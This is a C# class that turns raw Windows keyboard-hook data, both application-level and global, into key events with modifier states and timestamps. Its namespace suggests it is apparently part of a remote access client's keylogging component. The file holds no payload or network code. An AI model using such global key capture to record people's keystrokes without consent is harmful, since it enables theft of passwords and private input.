using System;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using xClient.KuuhakuÇekirdek.MouseKeyHook.WinApi;

namespace xClient.KuuhakuÇekirdek.MouseKeyHook
{
    public class EventArgsExtKlavye : KeyEventArgs
    {
        public EventArgsExtKlavye(Keys keyData)
            : base(keyData)
        {
        }

        internal EventArgsExtKlavye(Keys keyData, int timestamp, bool isKeyDown, bool isKeyUp)
            : this(keyData)
        {
            Timestamp = timestamp;
            IsKeyDown = isKeyDown;
            IsKeyUp = isKeyUp;
        }

        public int Timestamp { get; private set; }
        public bool IsKeyDown { get; private set; }
        public bool IsKeyUp { get; private set; }

        internal static EventArgsExtKlavye FromRawDataApp(CallbackData data)
        {
            var wParam = data.WParam;
            var lParam = data.LParam;

            const uint maskKeydown = 0x40000000; // bit 30
            const uint maskKeyup = 0x80000000; // bit 31 xd

            var timestamp = Environment.TickCount;

            var flags = (uint) lParam.ToInt64();
            var wasKeyDown = (flags & maskKeydown) > 0;
            var isKeyReleased = (flags & maskKeyup) > 0;

            var keyData = AppendModifierStates((Keys) wParam);

            var isKeyDown = !wasKeyDown && !isKeyReleased;
            var isKeyUp = wasKeyDown && isKeyReleased;

            return new EventArgsExtKlavye(keyData, timestamp, isKeyDown, isKeyUp);
        }

        internal static EventArgsExtKlavye FromRawDataGlobal(CallbackData data)
        {
            var wParam = data.WParam;
            var lParam = data.LParam;
            var keyboardHookStruct =
                (KeyboardHookStruct) Marshal.PtrToStructure(lParam, typeof (KeyboardHookStruct));
            var keyData = AppendModifierStates((Keys) keyboardHookStruct.VirtualKeyCode);

            var keyCode = (int) wParam;
            var isKeyDown = (keyCode == Messages.WM_KEYDOWN || keyCode == Messages.WM_SYSKEYDOWN);
            var isKeyUp = (keyCode == Messages.WM_KEYUP || keyCode == Messages.WM_SYSKEYUP);

            return new EventArgsExtKlavye(keyData, keyboardHookStruct.Time, isKeyDown, isKeyUp);
        }

        private static bool CheckModifier(int vKey)
        {
            return (KeyboardNativeMethods.GetKeyState(vKey) & 0x8000) > 0;
        }

        private static Keys AppendModifierStates(Keys keyData)
        {
            // CTRL basılı 
            var control = CheckModifier(KeyboardNativeMethods.VK_CONTROL);
            // Shift
            var shift = CheckModifier(KeyboardNativeMethods.VK_SHIFT);
            // Alt
            var alt = CheckModifier(KeyboardNativeMethods.VK_MENU);

            return keyData |
                   (control ? Keys.Control : Keys.None) |
                   (shift ? Keys.Shift : Keys.None) |
                   (alt ? Keys.Alt : Keys.None);
        }
    }
}